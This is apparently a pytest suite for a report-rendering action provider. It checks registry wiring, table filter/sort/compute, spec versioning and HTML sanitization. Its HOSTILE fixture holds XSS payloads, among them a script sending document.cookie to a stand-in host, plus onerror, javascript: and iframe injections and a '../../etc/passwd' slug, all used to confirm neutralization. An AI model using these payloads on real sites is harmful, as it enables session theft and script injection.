"""The `render-report` action provider and its renderer (KNOWLEDGE-SYNTHESIS §6.2 / KNOW-R15).

Two things are load-bearing here and both are the kind that pass a smoke test while broken.

**The wiring.** A provider that imports cleanly but is absent from the registry or from
`ALLOWED_HOOK_PROVIDERS` validates, saves, and then fails at run time — validation.py's own comment
records that failure mode. So the reachability tests go through `get_action_provider` and through
the allowlist, never through a direct import of the class.

**The sanitization.** Spec strings are LLM output over untrusted web/inbox material, and the export
is served same-origin with the dashboard. The hostile-spec tests assert on the RENDERED OUTPUT — a
provider that raised on a `<script>` would look secure while a slightly different payload sailed
through. What must hold is that the payload appears as inert text, never as markup.
"""

from __future__ import annotations

import json

import pytest

from personalclaw.action_providers.base import ActionContext
from personalclaw.action_providers.registry import (
    _ensure_default_providers_registered,
    get_action_provider,
)
from personalclaw.knowledge import reports

pytestmark = pytest.mark.anyio


@pytest.fixture
def anyio_backend() -> str:
    return "asyncio"


@pytest.fixture(autouse=True)
def _isolated_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("PERSONALCLAW_HOME", str(home))
    # The artifact registry caches its native provider against the old root, so without this every
    # test in the file writes into the first test's home.
    from personalclaw.artifacts import registry as art_registry

    art_registry._providers.clear()
    return home


@pytest.fixture
def provider():
    _ensure_default_providers_registered()
    p = get_action_provider("render-report")
    assert p is not None, "render-report is not registered"
    return p


CTX = ActionContext(event="workflow_node")

SPEC = {
    "title": "Weekly brief",
    "blocks": [
        {"type": "markdown", "text": "## Summary\n- shipped two things\n- **one** regression"},
        {
            "type": "table",
            "title": "Movers",
            "dataset": "movers",
            "filter": {"column": "delta", "op": "gt", "value": 1},
            "compute": [{"column": "pct", "op": "percent", "of": ["delta", "base"]}],
            "sort": {"column": "delta", "desc": True},
        },
        {"type": "xychart", "title": "Trend", "dataset": "trend", "style": "line"},
    ],
}

DATA = {
    "movers": [
        {"name": "alpha", "delta": 9, "base": 90},
        {"name": "beta", "delta": 2, "base": 40},
        {"name": "gamma", "delta": 0, "base": 10},
    ],
    "trend": {"x": ["mon", "tue", "wed"], "series": [{"name": "runs", "values": [3, 7, 5]}]},
}


# ── wiring: the provider must be REACHABLE, not merely importable ──


async def test_reachable_through_the_action_dispatch_path(provider):
    """Resolved by name from the registry, and it executes."""
    assert provider.name == "render-report"
    result = await provider.execute({"spec": SPEC, "data": DATA, "render_only": True}, CTX)
    assert result.success, result.error
    payload = json.loads(result.stdout)
    assert payload["blocks"] == 3


def test_registry_and_allowlist_agree():
    """A provider in one set but not the other saves and then fails at run time."""
    from personalclaw.validation import ALLOWED_HOOK_PROVIDERS

    _ensure_default_providers_registered()
    assert "render-report" in ALLOWED_HOOK_PROVIDERS
    assert get_action_provider("render-report") is not None


def test_classified_as_write_capable():
    """It writes two artifacts, so an auto-fired trigger must opt in explicitly (Decision 7)."""
    from personalclaw.triggers.screen import WRITE_CAPABLE_PROVIDERS, provider_is_read_only

    assert "render-report" in WRITE_CAPABLE_PROVIDERS
    assert provider_is_read_only("render-report") is False


# ── security: a hostile spec is NEUTRALIZED, not rejected ──

HOSTILE = {
    "title": "<script>alert('title')</script>",
    "blocks": [
        {
            "type": "markdown",
            "text": (
                "<script>fetch('https://evil.test/'+document.cookie)</script>\n"
                "<img src=x onerror=alert(1)>\n"
                '<img src="https://evil.test/beacon.gif">\n'
                "[click me](javascript:alert(2))\n"
                '<iframe src="https://evil.test/"></iframe>\n'
                "[a real link](https://ok.test/page)\n"
                "<style>@import url(https://evil.test/x.css)</style>\n"
                "and 2 < 3 is plain prose\n"
            ),
        },
        {
            "type": "table",
            "rows": [
                {"cell": "<script>alert(3)</script>", "other": "<img src=y onerror=alert(4)>"},
            ],
        },
        {
            "type": "xychart",
            "x": ["<script>alert(5)</script>"],
            "series": [{"name": "</svg><script>alert(6)</script>", "values": [1]}],
        },
    ],
}


async def test_hostile_spec_renders_inert(provider):
    """Every hostile construct survives as TEXT and none as markup."""
    result = await provider.execute({"spec": HOSTILE, "render_only": True}, CTX)
    assert result.success, result.error
    doc = json.loads(result.stdout)["html"]

    # No executable or fetching markup anywhere in the document.
    lowered = doc.lower()
    assert "<script" not in lowered
    assert "onerror" not in lowered
    assert "javascript:" not in lowered
    assert "<iframe" not in lowered
    assert "@import" not in lowered
    assert "evil.test" not in lowered, "a remote reference survived — the export would beacon"

    # MEASURED, not assumed: nh3 DELETES a disallowed element rather than escaping it, so the
    # `<script>`/`<img onerror>` payloads do not survive as text at all — only the prose around
    # them does. Pinning that here so a future switch to an escaping sanitizer (which would put
    # `&lt;script&gt;` into a report body) is a visible change rather than a silent one.
    assert "alert(1)" not in doc
    assert "and 2 &lt; 3 is plain prose" in doc, "escaping broke ordinary prose containing '<'"

    # A rejected `javascript:` link leaves the label AND the rejection visible: a silently
    # swallowed link would hide the fact that something tried one.
    assert "click me (link removed)" in doc
    # A legitimate https link written as markdown is still admitted — the control is a scheme
    # allowlist, not a blanket ban on links.
    assert 'href="https://ok.test/page"' in doc


async def test_hostile_spec_passes_the_self_containment_invariant(provider):
    """The finished document survives `assert_self_contained` — the belt-and-braces check."""
    result = await provider.execute({"spec": HOSTILE, "render_only": True}, CTX)
    reports.assert_self_contained(json.loads(result.stdout)["html"])


def test_self_containment_check_fails_closed():
    """It must actually FIRE. A check that never rejects anything is not a check."""
    with pytest.raises(reports.SpecError, match="script"):
        reports.assert_self_contained("<html><script>alert(1)</script></html>")
    with pytest.raises(reports.SpecError, match="remote reference"):
        reports.assert_self_contained('<html><img src="https://evil.test/x.png"></html>')
    with pytest.raises(reports.SpecError, match="event handler"):
        reports.assert_self_contained('<html><div onclick="x()"></div></html>')


def test_javascript_url_in_a_link_degrades_to_text():
    doc = reports.render_report(
        {"blocks": [{"type": "markdown", "text": "[x](javascript:alert(1)) [y](/local/page)"}]}
    ).html
    assert "javascript:" not in doc
    assert "x (link removed)" in doc
    assert 'href="/local/page"' in doc, "a relative link stays inside our own origin and is fine"


def test_rendered_document_is_self_contained():
    """No external CSS/JS/font references, and the stylesheet is inline."""
    doc = reports.render_report(SPEC, DATA).html
    assert "<style>" in doc
    assert "<link" not in doc.lower()
    # The SVG namespace is an XML declaration, not a fetch; nothing else may be remote.
    remainder = doc.replace('xmlns="http://www.w3.org/2000/svg"', "")
    assert "http://" not in remainder and "https://" not in remainder


# ── table ops: sort / filter / compute have an EFFECT ──


def test_table_ops_filter_sort_and_compute():
    doc = reports.render_report(SPEC, DATA).html
    assert "alpha" in doc and "beta" in doc
    assert "gamma" not in doc, "the delta > 1 filter did not drop the 0-row"
    assert doc.index("alpha") < doc.index("beta"), "descending sort by delta did not apply"
    assert "10" in doc, "the percent compute (9/90) did not render"


def test_numeric_filter_does_not_compare_as_text():
    """`"9" > "10"` is true as text — a spec filtering `> 10` would keep the 9-row."""
    rendered = reports.render_report(
        {
            "blocks": [
                {
                    "type": "table",
                    "rows": [{"n": "9"}, {"n": "10"}, {"n": "42"}],
                    "filter": {"column": "n", "op": "gt", "value": 10},
                }
            ]
        }
    )
    assert "42" in rendered.html
    assert ">9<" not in rendered.html


def test_compute_over_a_missing_input_renders_blank_not_zero():
    """A zero in a derived cell would be read as a measurement."""
    rendered = reports.render_report(
        {
            "blocks": [
                {
                    "type": "table",
                    "rows": [{"a": 4, "b": None}],
                    "compute": [{"column": "sum", "op": "sum", "of": ["a", "b"]}],
                }
            ]
        }
    )
    assert ">0<" not in rendered.html


# ── the spec is the versioned record; the HTML is a derived export ──


async def test_spec_is_versioned_and_html_is_the_derived_export(provider):
    result = await provider.execute({"slug": "weekly-brief", "spec": SPEC, "data": DATA}, CTX)
    assert result.success, result.error
    payload = json.loads(result.stdout)
    assert payload["spec_slug"] == "weekly-brief"
    assert payload["export_slug"] == "weekly-brief-report"

    from personalclaw.artifacts.registry import get_provider

    store = get_provider()
    spec_art = store.get("weekly-brief")
    export_art = store.get("weekly-brief-report")
    assert spec_art is not None and export_art is not None

    # The stored spec is the SPEC TEXT, round-trippable — not the rendered page.
    assert json.loads(spec_art.content)["title"] == "Weekly brief"
    assert spec_art.kind == "json"
    assert export_art.kind == "html"
    assert export_art.content.startswith("<!DOCTYPE html>")


async def test_regeneration_keeps_spec_history_and_replaces_the_export(provider):
    """A periodic re-render must not mint a spec version per run, and must refresh the export."""
    from personalclaw.artifacts.registry import get_provider

    first = await provider.execute({"slug": "brief", "spec": SPEC, "data": DATA}, CTX)
    assert first.success, first.error
    base_spec_version = json.loads(first.stdout)["spec_version"]

    fresher = {
        "movers": [{"name": "alpha", "delta": 11, "base": 90}],
        "trend": {"x": ["mon"], "series": [{"name": "runs", "values": [12]}]},
    }
    second = await provider.execute({"slug": "brief", "spec": SPEC, "data": fresher}, CTX)
    assert second.success, second.error

    store = get_provider()
    # SAME spec, fresh data: the spec artifact must not have gained an authored version.
    assert json.loads(second.stdout)["spec_version"] == base_spec_version
    assert store.list_versions("brief") == store.list_versions("brief")
    # The export carries the NEW numbers — this is the "regenerates visuals for free" claim.
    export = store.get("brief-report")
    assert "11" in export.content


async def test_changing_the_spec_records_a_new_spec_version(provider):
    from personalclaw.artifacts.registry import get_provider

    await provider.execute({"slug": "brief", "spec": SPEC, "data": DATA}, CTX)
    edited = json.loads(json.dumps(SPEC))
    edited["title"] = "Weekly brief v2"
    second = await provider.execute({"slug": "brief", "spec": edited, "data": DATA}, CTX)
    assert second.success, second.error

    store = get_provider()
    assert json.loads(store.get("brief").content)["title"] == "Weekly brief v2"
    assert store.list_versions("brief"), "an edited spec left no version history"


def test_canonical_spec_text_is_stable_under_key_order():
    """Byte-identity is what keeps a periodic re-submission from minting a version."""
    left = reports.canonical_spec_text(
        {"title": "a", "blocks": [{"type": "markdown", "text": "x"}]}
    )
    right = reports.canonical_spec_text(
        {"blocks": [{"text": "x", "type": "markdown"}], "title": "a"}
    )
    assert left == right


# ── spec errors are the author's errors ──


def test_unknown_block_kind_is_rejected_not_skipped():
    with pytest.raises(reports.SpecError, match="mermaid"):
        reports.parse_spec({"blocks": [{"type": "mermaid", "text": "graph TD"}]})


def test_empty_spec_is_rejected():
    with pytest.raises(reports.SpecError, match="blocks"):
        reports.parse_spec({"title": "nothing"})


async def test_missing_spec_reports_an_error(provider):
    result = await provider.execute({"slug": "x"}, CTX)
    assert not result.success
    assert "spec" in (result.error or "")


async def test_bad_slug_is_refused(provider):
    result = await provider.execute({"slug": "../../etc/passwd", "spec": SPEC}, CTX)
    assert not result.success
    assert "not a valid id" in (result.error or "")


async def test_a_missing_dataset_warns_but_still_renders(provider):
    """A fetch that found nothing must not lose the report's other blocks."""
    result = await provider.execute({"spec": SPEC, "data": {}, "render_only": True}, CTX)
    assert result.success, result.error
    payload = json.loads(result.stdout)
    assert any("was not supplied" in w for w in payload["warnings"])
    assert "shipped two things" in payload["html"]


def test_spec_accepts_json_text():
    """A `{{nodes.x.output}}` binding resolves to a string, not an object."""
    spec = reports.parse_spec(json.dumps(SPEC))
    assert spec["title"] == "Weekly brief"
